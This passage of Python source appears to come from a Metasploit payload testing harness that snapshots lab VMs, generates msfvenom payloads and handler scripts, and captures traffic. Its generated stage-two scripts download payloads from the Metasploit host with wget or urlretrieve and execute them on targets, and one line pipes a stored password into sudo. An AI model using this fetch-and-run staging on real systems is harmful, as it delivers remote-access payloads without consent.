    stageTwoPyContent = stageTwoPyContent + "    fileObj = open(logFile, 'a')\n"
    stageTwoPyContent = stageTwoPyContent + "    fileObj.write(logMessage)\n"
    stageTwoPyContent = stageTwoPyContent + "    fileObj.close()\n"
    stageTwoPyContent = stageTwoPyContent + "  except Exception as e:\n"
    stageTwoPyContent = stageTwoPyContent + "    print 'logError Failed: ' + str(e) + '\\n'\n"
    stageTwoPyContent = stageTwoPyContent + "    return False\n"
    stageTwoPyContent = stageTwoPyContent + "  return True\n"
    stageTwoPyContent = stageTwoPyContent + "\n"
    stageTwoPyContent = stageTwoPyContent + "def getPayload(url, localName, logFile):\n"
    stageTwoPyContent = stageTwoPyContent + "  downloadSuccess = False\n"
    stageTwoPyContent = stageTwoPyContent + "  for i in range(10):\n"
    stageTwoPyContent = stageTwoPyContent + "    logError(logFile, 'DOWNLOADING ' + url + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "    try:\n"
    stageTwoPyContent = stageTwoPyContent + "      urllib.urlretrieve(url, localName)\n"
    stageTwoPyContent = stageTwoPyContent + "    except Exception as e:\n"
    stageTwoPyContent = stageTwoPyContent + "      logError(logFile, 'FAILED TO GET ' + url + ':\\n' + str(e) + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "      time.sleep(5)\n"
    stageTwoPyContent = stageTwoPyContent + "      continue\n"
    stageTwoPyContent = stageTwoPyContent + "    logError(logFile, 'DOWNLOADED ' + url + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "    break\n"
    stageTwoPyContent = stageTwoPyContent + "  return True\n"
    stageTwoPyContent = stageTwoPyContent + "\n"
    stageTwoPyContent = stageTwoPyContent + "def runCommand(cmdList, getOutput, logFile):\n"
    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'LAUNCHING ' + ' '.join(cmdList) + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "  try:\n"
    stageTwoPyContent = stageTwoPyContent + "    payloadProcess = subprocess.Popen(cmdList, stdout = subprocess.PIPE, stderr = subprocess.PIPE)\n"
    stageTwoPyContent = stageTwoPyContent + "  except Exception as e:\n"
    stageTwoPyContent = stageTwoPyContent + "    logError(logFile, 'FAILED TO RUN ' + ' '.join(cmdList) + ':\\n' + str(e) +'\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "    return False\n"
    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'LAUNCHED ' + ' '.join(cmdList) + '\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "  time.sleep(5)\n"
    stageTwoPyContent = stageTwoPyContent + "  if getOutput:\n"
    stageTwoPyContent = stageTwoPyContent + "    return payloadProcess.communicate()\n"
    stageTwoPyContent = stageTwoPyContent + "  return True\n"
    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "', 'TESTING\\n')\n"
    stageTwoPyContent = stageTwoPyContent + "\n"

    for sessionData in targetData['SESSION_DATASETS']:
        if 'PAYLOAD' in sessionData and sessionData['MODULE']['NAME'].lower() == "exploit/multi/handler":
            msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
            payloadFile = sessionData['PAYLOAD']['FILENAME']
            stageTwoPyContent = stageTwoPyContent + "url = 'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
            stageTwoPyContent = stageTwoPyContent + "fileName = r'" + targetData['PAYLOAD_DIRECTORY'] + '\\' + payloadFile + "'\n"
            if '.py' in payloadFile:
                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_PYTHON'] +"', fileName]\n"
            elif 'jar' in payloadFile:
                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_JAVA'] + "','-jar', fileName]\n"
            else:
                stageTwoPyContent = stageTwoPyContent + "cmdList = [fileName]\n"
        stageTwoPyContent = stageTwoPyContent + "getPayload(url, fileName, r'" + remoteLogFile + "')\n"
        stageTwoPyContent = stageTwoPyContent + "runCommand(cmdList, False, r'" + remoteLogFile + "')\n"
    stageTwoPyContent = stageTwoPyContent + "time.sleep(5)\n"
    stageTwoPyContent = stageTwoPyContent + "cmdList = ['netstat',  '-ant']\n"
    stageTwoPyContent = stageTwoPyContent + "netstatResults = runCommand(cmdList, True, r'" + remoteLogFile + "')\n"
    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "', str(netstatResults[0]))\n"
    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "', str(netstatResults[1]))\n"
    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "','" + terminationToken + "\\n')\n"

    return stageTwoPyContent


def makeStageTwoShScript(targetData, httpPort, remoteLogFile, terminationToken):
    stageTwoShContent = "# AUTOGENERATED TEST SCRIPT \n"
    stageTwoShContent = stageTwoShContent + "cd " + targetData['PAYLOAD_DIRECTORY'] + " \n"
    for sessionData in targetData['SESSION_DATASETS']:
        if 'PAYLOAD' in sessionData and sessionData['MODULE']['NAME'].lower() == "exploit/multi/handler":
            msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
            payloadFile = sessionData['PAYLOAD']['FILENAME']
            url = "'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
            stageTwoShContent = stageTwoShContent + "\nwget " + url + "\n"
            stageTwoShContent = stageTwoShContent + "sleep 5 \n"
            stageTwoShContent = stageTwoShContent + "chmod 755 " + payloadFile + "\n"
            if '.py' in payloadFile:
                stageTwoShContent = stageTwoShContent + targetData['METERPRETER_PYTHON'] + " " + payloadFile + "&\n"
            elif 'jar' in payloadFile:
                stageTwoShContent = stageTwoShContent + targetData['METERPRETER_JAVA'] + " -jar " + payloadFile + "&\n"
            else:
                stageTwoShContent = stageTwoShContent + "./" + payloadFile + "&\n"
            stageTwoShContent = stageTwoShContent + "echo " + terminationToken + " > " + remoteLogFile + "\n"
    return stageTwoShContent


def parseHypervisorConfig(hypervisorConfigFile):
    try:
        fileObj = open(hypervisorConfigFile, 'r')
        jsonString = fileObj.read()
        fileObj.close()
    except IOError as e:
        print("FAILED TO FIND HYPERVISOR CONFIG FILE: " + hypervisorConfigFile)
        return None
    try:
        hypervisorData = json.loads(jsonString)
    except Exception as e:
        print("FAILED TO PARSE HYPERVISOR CONFIG FILE: " + str(e))
        return None
    return hypervisorData


def parseTestConfig(configFile):
    try:
        fileObj = open(configFile, 'r')
        jsonString = fileObj.read()
        fileObj.close
    except IOError as e:
        print("FAILED TO OPEN: " + configFile + '\n' + str(e))
        return None
    try:
        jsonDic = json.loads(jsonString)
    except Exception as e:
        print("FAILED TO PARSE DATA FROM: " + configFile + '\n' + str(e))
        return None
    return jsonDic

def prepConfig(args):
    logFile = None
    configData = parseTestConfig(args.testfile)
    if None == configData:
        logMsg(logFile, "THERE WAS A PROBLEM WITH THE TEST JSON CONFIG FILE")
        exit(999)
        
    if args.targetName != None:
        logMsg(logFile, "REPLACING ALL TARGETS WITH SINGLE TARGET " + str(args.targetName))
        newTargets = []
        targetOverride = { 'CPE': str(args.targetName),
                           'OS': str(args.targetName),
                           'NAME': str(args.targetName) } 
        mergedTarget = configData['TARGETS'][0].copy()
        mergedTarget.update(targetOverride)
        newTargets.append(mergedTarget)
        configData['TARGETS'] = newTargets

    if args.framework != None:
        configData['FRAMEWORK_BRANCH'] = args.framework

    if args.payload != None:
        payloadDic = {}
        payloadDic['NAME'] = args.payload
        if args.payloadoptions != None:
            payloadDic['SETTINGS'] = args.payloadoptions.split(',')
        else:
            payloadDic['SETTINGS'] = []
        if 'PAYLOADS' in configData:
            configData['PAYLOADS'].append(payloadDic.copy())
        else:
            configData['PAYLOADS'] = [payloadDic.copy()]
        if (args.module == None) and ('MODULES' not in configData):
            args.module = "exploit/multi/handler"

    if args.module != None:
        moduleDic = {}
        moduleDic['NAME'] = args.module
        moduleDic['SETTINGS'] = []
        if 'MODULES' in configData:
            configData['MODULES'].append(moduleDic.copy())
        else:
            configData['MODULES'] = [moduleDic.copy()]
    """
    SET UP DIRECTORY NAMES IN THE CONFIG DICTIONARY
    """
    if 'FRAMEWORK_BRANCH' not in configData:
        configData['FRAMEWORK_BRANCH'] = 'upstream/master'
    configData['REPORT_PREFIX'] = os.path.splitext(os.path.basename(args.testfile))[0]
    if args.payload != None:
        payloadType = args.payload.split('/')[-1]
        configData['REPORT_PREFIX'] = configData['REPORT_PREFIX'] + "-" + payloadType
    configData['TIMESTAMP'] =   str(time.time()).split('.')[0]
    configData['DATA_DIR']  =   os.getcwd() + "/" + "test_data"
    configData['TEST_DIR'] =    configData['DATA_DIR'] + "/" + configData['REPORT_PREFIX'] + "_" + configData['TIMESTAMP']
    configData['REPORT_DIR'] =  configData['TEST_DIR'] + "/" + "reports"
    configData['SESSION_DIR'] = configData['TEST_DIR'] + "/" + "sessions"
    configData['SCRIPT_DIR'] =  configData['TEST_DIR'] + "/" + "scripts"

    if not os.path.exists(configData['DATA_DIR']):
        os.makedirs(configData['DATA_DIR'])
    if not os.path.exists(configData['TEST_DIR']):
        os.makedirs(configData['TEST_DIR'])
    if not os.path.exists(configData['REPORT_DIR']):
        os.makedirs(configData['REPORT_DIR'])
    if not os.path.exists(configData['SESSION_DIR']):
        os.makedirs(configData['SESSION_DIR'])
    if not os.path.exists(configData['SCRIPT_DIR']):
        os.makedirs(configData['SCRIPT_DIR'])
        
    """
    ADD LOGFILE TO THE configData DICTIONARY
    """
    configData['LOG_FILE'] = configData['REPORT_DIR'] + "/testlog.log"
    
    if 'TARGET_GLOBALS' in configData:
        expandGlobalAttributes(configData)

    return configData


def prepStagedScripts(testConfig, portNum):
    """
    THIS SECTION MARSHALLS THE DATA WE WILL NEED LATER TO GENERATE THE THREE STAGED SCRIPTS
    TO MAKE THE STAGE ONE SCRIPT, CREATE THE MSFVENOM COMMANDS AND RC SCRIPTS, THEN SPLIT 
    THEM BETWEEN THE MSF_HOSTS
    
    FOR EACH PAYLOAD TO AN UPLOAD TARGET:
    PREP STAGE ONE SCRIPT:
        (1) GENERATE THE MSFVENOM COMMAND TO EXECUTE ON THE MSF_HOST TO MAKE THE PAYLOAD
        (2) ADD THE MSFVENOM COMMAND TO THE STAGE ONE SCRIPT
        (3) GENERATE AN RC SCRIPT TO RUN ON THE MSFHOST TO SET UP THE PAYLOAD HANDLER
        (4) WRITE THE RC SCRIPT TO DISK LOCALLY
        (5) ADD COMMANDS TO THE STAGE ONE SCRIPT TO LAUNCH MSFCONSOLE WITH RC SCRIPTS TO SET UP FOR REVERSE PAYLOAD CALLBACKS
        (6) ADD COMMAND TO STAGE ONE SCRIPT TO START HTTP SERVER LOCALLY TO HOST THE PAYLOADS FOR DOWNLOAD
    PREP STAGE TWO SCRIPT:
        (1) DETERMINE OS OF TARGET TO DETERMINE WHAT KIND OF SCRIPT WE NEED
        (2) ADD COMANDS TO THE STAGE TWO SCRIPT SO THE TAGETS DOWNLOAD THE PAYLOAD AND EXECUTE IT
    """
    """
    THE FIRST FEW LINES OF THE STAGE ONE SCRIPT PREP THINGS
    """
    """
    CREATE STAGE SCRIPTS
        STAGE_ONE_SCRIPT: 
            RUNS ON MSF_HOSTS AND CONTAIN THE MSFVENOM COMMANDS TO 
            CREATE THE PAYLOADS THAT NEED TO BE UPLOADED TO THE TARGETS,
            START AN HTTP SERVER ON THE MSF_HOSTS TO SERVE THE PAYLOADS,
            AND LAUNCH THE SPECIFIED EXPLOITS
        STAGE_TWO_SCRIPTS:
            RUN ON TARGET SYSTEMS AND CONTAIN THE COMMANDS TO DOWNLOAD 
            THE PAYLOADS FROM THE MSF_HOSTS AND LAUNCH THEM ON THE TARGETS
        STAGE_THREE_SCRIPT:
            RUN ON THE MSF_HOSTS TO ESTABLISH CONNECTIONS TO THE BIND PAYLOADS
    """
    lineComment = '\n#################################################################\n'
    for host in testConfig['MSF_HOSTS']:
        host['STAGE_ONE_SCRIPT'] = lineComment + "\n # STAGE ONE SCRIPT FOR " + host['NAME'] + lineComment
        host['STAGE_THREE_SCRIPT'] = lineComment + "\n # STAGE THREE SCRIPT FOR " + host['NAME'] + lineComment
    for host in testConfig['TARGETS']:
        host['STAGE_TWO_SCRIPT'] = lineComment + "\n # STAGE TWO SCRIPT FOR " + host['NAME'] + lineComment   
    
    fileId=0;
    for host in testConfig['MSF_HOSTS']:
        host['LISTEN_PORTS'] = []
        fileId = fileId + 1
        # STAGE ONE SCRIPT STUFF
        host['STAGE_ONE_FILENAME'] =    testConfig['SCRIPT_DIR'] + '/' + "stageOneScript_" +  str(fileId) + ".sh"
        host['MSF_PAYLOAD_PATH'] =      host['MSF_ARTIFACT_PATH'] + "/test_payloads"
        host['RC_PATH'] =               host['MSF_ARTIFACT_PATH'] + "/test_rc"
        host['COMMIT_FILE'] =           host['MSF_ARTIFACT_PATH'] + "/commit_tag_" + testConfig['TIMESTAMP']
        host ['SCRIPT_PATH'] =          host['MSF_ARTIFACT_PATH'] + "/test_scripts"
        host['STAGE_THREE_LOGFILE'] =   host['SCRIPT_PATH'] + "/stageThreeLog.txt"
        host['PCAP_FILE'] =             host['MSF_ARTIFACT_PATH'] + "/logfile.pcap"
        stageOneContent = "#!/bin/bash -l \n\n"
        stageOneContent = stageOneContent + "cd " + host['MSF_PATH'] + "\n"
        stageOneContent = stageOneContent + "git fetch upstream\n"
        stageOneContent = stageOneContent + "git reset --hard FETCH_HEAD\n"
        stageOneContent = stageOneContent + "git clean -df\n"
        stageOneContent = stageOneContent + generateBranchScript(testConfig['FRAMEWORK_BRANCH'], testConfig['LOG_FILE'])
        
        stageOneContent = stageOneContent + "git log | head -n 1 > " + host['COMMIT_FILE'] + "\n"
        stageOneContent = stageOneContent + "source ~/.rvm/scripts/rvm\n"
        stageOneContent = stageOneContent + "cd " + host['MSF_PATH'] + "\n"
        stageOneContent = stageOneContent + "rvm --install $(cat .ruby-version)\n"
        stageOneContent = stageOneContent + "gem install bundler\n"
        stageOneContent = stageOneContent + "bundle install\n"
        stageOneContent = stageOneContent + "mkdir " + host['MSF_PAYLOAD_PATH'] + "\n"
        stageOneContent = stageOneContent + "rm -rf " + host['MSF_PAYLOAD_PATH'] + "/*\n"
        stageOneContent = stageOneContent + "mkdir " + host['RC_PATH'] + "\n"
        stageOneContent = stageOneContent + "rm -rf " + host['RC_PATH'] + "/*\n"
        stageOneContent = stageOneContent + "echo '" +host['PASSWORD']+ "' | sudo -S tcpdump -i any -s0 -nn net 192.168.0.0/16 -w " + host['PCAP_FILE'] + " &\n"
        
        host['STAGE_ONE_SCRIPT'] = stageOneContent
        host['STAGE_THREE_SCRIPT'] = "#!/bin/bash -l\n\n"
        host['STAGE_THREE_SCRIPT'] = host['STAGE_THREE_SCRIPT'] + "cd " + host['MSF_PATH'] + "\n"
        host['STAGE_THREE_SCRIPT'] = host['STAGE_THREE_SCRIPT'] + "source ~/.rvm/scripts/rvm\n"
        host['STAGE_THREE_SCRIPT'] = host['STAGE_THREE_SCRIPT'] + "cd " + host['MSF_PATH'] + "\n"
        host['STAGE_THREE_SCRIPT'] = host['STAGE_THREE_SCRIPT'] + "rvm --install $(cat .ruby-version)\n"
        host['STAGE_THREE_SCRIPT'] = host['STAGE_THREE_SCRIPT'] + "gem install bundler\n"
        host['STAGE_THREE_SCRIPT'] = host['STAGE_THREE_SCRIPT'] + "bundle install\n"

    sessionCounter = 0
    for host in testConfig['TARGETS']:
        host['LISTEN_PORTS'] = []
        logMsg(testConfig['LOG_FILE'], "=============================================================================")
        logMsg(testConfig['LOG_FILE'], host['NAME'])
        logMsg(testConfig['LOG_FILE'], "=============================================================================")
        for sessionData in host['SESSION_DATASETS']:
            sessionData['MSF_HOST'] = testConfig['MSF_HOSTS'][sessionCounter % len(testConfig['MSF_HOSTS'])]
            sessionCounter = sessionCounter + 1
            logMsg(testConfig['LOG_FILE'], "ASSIGNING TO MSF_HOST " + sessionData['MSF_HOST']['NAME'])
            stageOneContent = '\n\n##########################\n'
            stageOneContent = stageOneContent + '# MODULE:  ' + sessionData['MODULE']['NAME'] + '\n'
            if 'PAYLOAD' in sessionData:
                stageOneContent = stageOneContent + '# PAYLOAD:  ' + sessionData['PAYLOAD']['NAME'] + '\n'
                sessionData['PAYLOAD']['PRIMARY_PORT'] = portNum.get()
                uniqueId = str(sessionData['PAYLOAD']['PRIMARY_PORT'])
                if 'reverse' in sessionData['PAYLOAD']['NAME'].lower() \
                    and sessionData['MODULE']['NAME'].lower() == 'exploit/multi/handler':
                    sessionData['MSF_HOST']['LISTEN_PORTS'].append(str(sessionData['PAYLOAD']['PRIMARY_PORT']))
            else:
                uniqueId = getTimestamp()
            stageOneContent = stageOneContent + '# TARGET:   ' + host['IP_ADDRESS'] + '\n'
            stageOneContent = stageOneContent + '# MSF_HOST: ' + sessionData['MSF_HOST']['IP_ADDRESS'] + '\n'
            stageOneContent = stageOneContent + '#\n'
            if sessionData['MODULE']['NAME'].lower() == 'exploit/multi/handler':
                # WE NEED TO ADD THE MSFVENOM COMMAND TO MAKE THE PAYLOAD TO THE STAGE ONE SCRIPT
                sessionData['PAYLOAD']['FILENAME'] =    '-'.join(sessionData['PAYLOAD']['NAME'].split('/')) + \
                                                        '-' + 'x'.join(host['IP_ADDRESS'].split('.')) + \
                                                        '-' + uniqueId
                sessionData['PAYLOAD']['VENOM_CMD'] =  makeVenomCmd(host, 
                                                                    sessionData, 
                                                                    portNum, 
                                                                    testConfig['LOG_FILE'])
                # ADD VENOM COMMAND TO THE SCRIPT CONTENT
                stageOneContent = stageOneContent + sessionData['PAYLOAD']['VENOM_CMD'] + '\n'
                stageOneContent = stageOneContent + 'mv ' + sessionData['PAYLOAD']['FILENAME'] + \
                                            ' ' + sessionData['MSF_HOST']['MSF_PAYLOAD_PATH'] + '/' +  sessionData['PAYLOAD']['FILENAME'] + '\n'
                stageOneContent = stageOneContent + "sleep 20\n"
                sessionData['RC_IN_SCRIPT_NAME'] = sessionData['MSF_HOST']['RC_PATH'] + '/' + sessionData['PAYLOAD']['FILENAME'].split('.')[0]+'.rc'
            else:
                sessionData['RC_IN_SCRIPT_NAME'] = sessionData['MSF_HOST']['RC_PATH'] + '/' + '-'.join(sessionData['MODULE']['NAME'].split('/')) + '_' + \
                                                    host['IP_ADDRESS'] + '_' + uniqueId + '.rc'
            sessionData['RC_OUT_SCRIPT_NAME'] = sessionData['RC_IN_SCRIPT_NAME'] + '.txt'
            rcScriptContent = makeRcScript(testConfig['COMMAND_LIST'],
                                                      host, 
                                                      sessionData, 
                                                      testConfig['LOG_FILE'],
                                                      portNum)
            stageOneContent = stageOneContent + rcScriptContent + '\n'
            if 'PAYLOAD' in sessionData \
                and 'bind' in sessionData['PAYLOAD']['NAME'].lower() \
                and sessionData['MODULE']['NAME'].lower() == 'exploit/multi/handler':
                    launchBind = './msfconsole -qr '+ sessionData['RC_IN_SCRIPT_NAME'] + ' > ' + sessionData['RC_OUT_SCRIPT_NAME'] + '&\n'
                    logLaunch = "echo 'LAUNCHING " + sessionData['RC_IN_SCRIPT_NAME'] + "' >> " + sessionData['MSF_HOST']['STAGE_THREE_LOGFILE'] + '\n'
                    sessionData['MSF_HOST']['STAGE_THREE_SCRIPT'] = sessionData['MSF_HOST']['STAGE_THREE_SCRIPT'] + launchBind
                    sessionData['MSF_HOST']['STAGE_THREE_SCRIPT'] = sessionData['MSF_HOST']['STAGE_THREE_SCRIPT'] + logLaunch
                    logLaunch = "echo 'SUCCESSFULLY LAUNCHED " + sessionData['RC_IN_SCRIPT_NAME'] + "' >> " + sessionData['MSF_HOST']['STAGE_THREE_LOGFILE'] + '\n'
                    sessionData['MSF_HOST']['STAGE_THREE_SCRIPT'] = sessionData['MSF_HOST']['STAGE_THREE_SCRIPT'] + logLaunch
                    sessionData['MSF_HOST']['STAGE_THREE_SCRIPT'] = sessionData['MSF_HOST']['STAGE_THREE_SCRIPT'] + "sleep 10\n"
            else:
                stageOneContent = stageOneContent + './msfconsole -qr '+ \
                                        sessionData['RC_IN_SCRIPT_NAME'] + ' > ' + sessionData['RC_OUT_SCRIPT_NAME'] + ' &\n'
            sessionData['MSF_HOST']['STAGE_ONE_SCRIPT'] = sessionData['MSF_HOST']['STAGE_ONE_SCRIPT'] + stageOneContent
    return sessionCounter


def prepTestVms(testConfig):
    """
    PREP ALL MSF_HOSTS AND TARGETS
    FOR VIRTUAL HOSTS:
    1. IF THERE'S a SNAPSHOT TO USE, REVERT TO IT; OTHERWISE, TAKE A TEMP SNAPSHOT
    2. POWER-ON
    
    FOR PHYSICAL TARGETS:
    1. ASSUME THEY ARE READY (FOR NOW..... I HAVE FUN PLANS FOR LATER)
    """
    testVms = []
    for host in testConfig['TARGETS'] + testConfig['MSF_HOSTS']:
        if host['TYPE'] == "VIRTUAL":
            host['TEMP_SNAPSHOT'] = 'PAYLOAD_TESTING_'+testConfig['TIMESTAMP']
            if not host['VM_OBJECT'].takeSnapshot(host['TEMP_SNAPSHOT']):
                logMsg(testConfig['LOG_FILE'], "FAILED TO CREATE SNAPSHOT ON " + host['NAME'])
            if 'TESTING_SNAPSHOT' in host:
                logMsg(testConfig['LOG_FILE'], "TRYING TO REVERT " + host['NAME'] + " TO " + host['TESTING_SNAPSHOT'])
                host['VM_OBJECT'].revertToSnapshotByName(host['TESTING_SNAPSHOT'])
    for host in testConfig['TARGETS'] + testConfig['MSF_HOSTS']:
        if host['TYPE'] == 'VIRTUAL':
            testVms.append(host['VM_OBJECT'])
            host['VM_OBJECT'].getSnapshots()
            host['VM_OBJECT'].powerOn(False)
            time.sleep(2)
    return testVms


def pullMsfLogs(testConfig):
    logFile = None
    for msfHost in testConfig['MSF_HOSTS']:
        msfHost['VM_OBJECT'].runCmdOnGuest(['/usr/bin/killall', 'tcpdump'])
        srcFile = msfHost['PCAP_FILE']
        dstFile = testConfig['REPORT_DIR'] + "/" + msfHost['NAME'] + ".pcap"
        msfHost['LOCAL_PCAP'] = dstFile
        msfHost['VM_OBJECT'].getFileFromGuest(srcFile, dstFile)
        srcFile = msfHost['COMMIT_FILE']
        dstFile = testConfig['REPORT_DIR'] + "/commit_" + '-'.join(msfHost['IP_ADDRESS'].split('.')) + ".txt"
        msfHost['VM_OBJECT'].getFileFromGuest(srcFile, dstFile)
        try:
            fileObj = open(dstFile, 'r')
            commitRaw = fileObj.read().strip()
            fileObj.close()
        except IOError as e:
            logMsg(logFile, "FAILED TO OPEN " + dstFile)
            logMsg(logFile, "SYSTEM ERROR: \n" + str(e))
        else:
            try:
                msfHost['COMMIT_VERSION'] = commitRaw.split(' ')[1]
                logMsg(testConfig['LOG_FILE'], "COMMIT VERSION OF metasploit-framework on " + msfHost['NAME'] + ": " + msfHost['COMMIT_VERSION'])
            except:
                logMsg(testConfig['LOG_FILE'], "FAILED TO RETRIEVE COMMIT VERSION")
                msfHost['COMMIT_VERSION'] = "UNKNOWN"
    return None


def pullTargetLogs(testConfig):
    for target in testConfig['TARGETS']:
        for sessionData in target['SESSION_DATASETS']:
            remoteFileName = sessionData['RC_OUT_SCRIPT_NAME']
            logMsg(testConfig['LOG_FILE'], "RC_OUT_SCRIPT_NAME = " + str(sessionData['RC_OUT_SCRIPT_NAME']))
            logMsg(testConfig['LOG_FILE'], "SESSION_DIR = " + testConfig['SESSION_DIR'])
            logMsg(testConfig['LOG_FILE'], "RC_OUT_SCRIPT_NAME = " + str(sessionData['RC_OUT_SCRIPT_NAME'].split('/')[-1]))
            localFileName = testConfig['SESSION_DIR'] + '/' + str(sessionData['RC_OUT_SCRIPT_NAME'].split('/')[-1])
            sessionData['LOCAL_SESSION_FILE'] = localFileName
            logMsg(testConfig['LOG_FILE'], "SAVING " + target['NAME'] + ":" + remoteFileName + " AS " + localFileName)
            if not sessionData['MSF_HOST']['VM_OBJECT'].getFileFromGuest(remoteFileName, localFileName):
                logMsg(testConfig['LOG_FILE'], "FAILED TO SAVE " + target['NAME'] + ":" + remoteFileName + " AS " + localFileName)
            remoteFileName = sessionData['RC_IN_SCRIPT_NAME']
            localFileName = testConfig['SESSION_DIR'] + '/' + str(sessionData['RC_IN_SCRIPT_NAME'].split('/')[-1])
            if not sessionData['MSF_HOST']['VM_OBJECT'].getFileFromGuest(remoteFileName, localFileName):
                logMsg(testConfig['LOG_FILE'], "FAILED TO SAVE " + target['NAME'] + ":" + remoteFileName + " AS " + localFileName)
    return None


def replacePortKeywords(testConfig, portNum):
    for target in testConfig['TARGETS']:
        logMsg(testConfig['LOG_FILE'], "MODULES = " + str(target['MODULES']))
        if 'PAYLOADS' in target:
            logMsg(testConfig['LOG_FILE'], "PAYLOADS = " + str(target['PAYLOADS']))
            for payload in target['PAYLOADS']:
                logMsg(testConfig['LOG_FILE'], str(payload))
                # REPLACE THE STRING 'UNIQUE_PORT' WITH AN ACTUAL UNIQUE PORT
#                for settingItem in payload['SETTINGS']:
#                    logMsg(testConfig['LOG_FILE'], "SETTING ITEM= " + settingItem + str(id(settingItem)))
#                    logMsg(testConfig['LOG_FILE'], "SETTING ITEM= " + settingItem + str(id(settingItem)))
                for index in range(len(payload['SETTINGS'])):
                    logMsg(testConfig['LOG_FILE'], "SETTING ITEM= " + payload['SETTINGS'][index] + str(id(payload['SETTINGS'][index])))
                    if 'UNIQUE_PORT' in payload['SETTINGS'][index]:
                        originalString = payload['SETTINGS'][index]
                        payload['SETTINGS'][index] = originalString.replace("UNIQUE_PORT", str(portNum.get()), 1)
                    logMsg(testConfig['LOG_FILE'], "SETTING ITEM= " + payload['SETTINGS'][index] + str(id(payload['SETTINGS'][index])))
        for module in target['MODULES']:
            logMsg(testConfig['LOG_FILE'], str(module))
            for index in range(len(module['SETTINGS'])):
                logMsg(testConfig['LOG_FILE'], "SETTING ITEM= " + module['SETTINGS'][index] + str(id(module['SETTINGS'][index])))


def replaceWildcards(originalString, targetData, sessionData, portNum):
    if 'UNIQUE_PORT' in originalString:
        originalString = originalString.replace("UNIQUE_PORT", str(portNum.get()), 1)
    if 'MSF_IP' in originalString:
        originalString = originalString.replace("MSF_IP", sessionData['MSF_HOST']['IP_ADDRESS'], 1)
    if 'TARGET_IP' in originalString:
        originalString = originalString.replace("TARGET_IP", targetData['IP_ADDRESS'], 1)
    if 'TARGET_USERNAME' in originalString:
        originalString = originalString.replace("TARGET_USERNAME", targetData['USERNAME'], 1)
    if 'TARGET_PASSWORD' in originalString:
        originalString = originalString.replace("TARGET_PASSWORD", targetData['PASSWORD'], 1)
    return originalString


def resetVms(testConfig):
    if testConfig == None or 'LOG_FILE' not in testConfig:
        return False
    retVal = True
    for hostKey in ['MSF_HOSTS', 'TARGETS']:
        if hostKey in testConfig:
            for host in (testConfig[hostKey]):
                if host['TYPE'] == "VIRTUAL":
                    logMsg(testConfig['LOG_FILE'], "RESETTING VM " + host['NAME'])
                    if 'TEMP_SNAPSHOT' in host:
                        logMsg(testConfig['LOG_FILE'], "RESETTING VM " + host['NAME'] + " TO " + str(host['TEMP_SNAPSHOT']))
                        host['VM_OBJECT'].revertToSnapshotByName(host['TEMP_SNAPSHOT'])
                        host['VM_OBJECT'].powerOff()
                        host['VM_OBJECT'].deleteSnapshot(host['TEMP_SNAPSHOT'])
                    else:
                        logMsg(testConfig['LOG_FILE'], "NO TEMP SNAPSHOT FOUND FOR " + host['NAME'])
                        retVal = False
    return retVal


def revertVm(vmObject, snapshot = None):
    if vmObject is None:
        return False
    vmObject.getSnapshots()
    if snapshot is not None:
        """
        JUST RETURN TO THE TESTING SNAPSHOT
        """
        return vmObject.revertToSnapshotByName(snapshot)
    else:
        """
        JUST RESET TO THE TEMP SNAPSHOT
        """
        vmObject.snapshotList.sort(reverse=True)
        for i in vmObject.snapshotList:
            if "PAYLOAD_TESTING-" in i[0].name:
                vmObject.server.logMsg("REVERTING " + vmObject.vmName + " TO " + i[0].name)
                vmObject.revertToSnapshot(i[0].snapshot)
                vmObject.deleteSnapshot(i[0].name)
        vmObject.powerOff()
        return True


def runTest(testConfig, portNum):
    """
    FIGURE OUT HOW MANY PAYLOADS WE HAVE AND HOW MANY MSF_HOSTS WE HAVE
    SO WE CAN SPLIT THE WORK AMONG ALL MSF_HOSTS
    """
    msfHostCount = len(testConfig['MSF_HOSTS'])
    sessionCount = getSessionCount(testConfig)
    logMsg(testConfig['LOG_FILE'], "MSF_HOST COUNT = " + str(msfHostCount))
    logMsg(testConfig['LOG_FILE'], "SESSION COUNT = " + str(sessionCount))

    testVms = instantiateVmsAndServers(testConfig)
    # IF WE COULD NOT FIND A VM, ABORT
    if None in testVms:
        return False

    # TAKE SNAPSHOT AND/OR SET THE VMS TO THE DESIRED SNAPSHOT AND POWERS ON
    prepTestVms(testConfig)
    
    # WAIT UNTIL ALL VMS HAVE A WORKING TOOLS SERVICE AND AN IP ADDRESS
    if not waitForVms(testVms):
        return False
        
    """
    MAKE SURE THE TEST CONFIG HAS ANY DHCP ADDRESSES SET PROPERLY AND VERIFY ALL TARGETS?MSF_HOSTS HAVE AN IP
    """
    if not setVmIPs(testConfig):
        return False

    """
    CREATE REQUIRED DIRECTORY FOR PAYLOADS ON VM_TOOLS MANAGED MACHINES
    CAN'T DO THIS EARLIER, AS THE MACHINES WERE OFF AND WE NEEDED DHCP-GENERATED IP ADDRESSES
    """
    for host in testConfig['TARGETS']:
        if "VM_TOOLS_UPLOAD" in host['METHOD'].upper():
            host['VM_OBJECT'].makeDirOnGuest(host['PAYLOAD_DIRECTORY'])
    sessionCounter = prepStagedScripts(testConfig, portNum)
    timeoutSeconds = 200
    if not finishAndLaunchStageOne(testConfig['MSF_HOSTS'], testConfig['HTTP_PORT'], testConfig['LOG_FILE']):
        logMsg(testConfig['LOG_FILE'], "FAILED finishAndLaunchStageOne")
        return False
